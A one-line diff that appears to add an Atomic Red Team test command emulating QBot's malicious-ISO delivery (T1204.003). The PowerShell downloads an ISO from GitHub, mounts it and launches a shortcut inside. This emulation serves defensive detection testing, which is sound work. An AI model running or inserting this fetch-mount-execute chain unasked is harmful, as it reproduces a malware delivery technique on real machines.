@@ -1,0 +1,1 @@
+IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.003/src/qbot-test.iso" -OutFile "$env:TEMP\qbot-test.iso"); Mount-DiskImage -ImagePath "$env:TEMP\qbot-test.iso"; $mountedpath = (Get-DiskImage -ImagePath "$env:TEMP\qbot-test.iso" | Get-Volume).DriveLetter; $finalpath = $mountedpath + ":\"; cd $finalpath; .\calc.exe.lnk
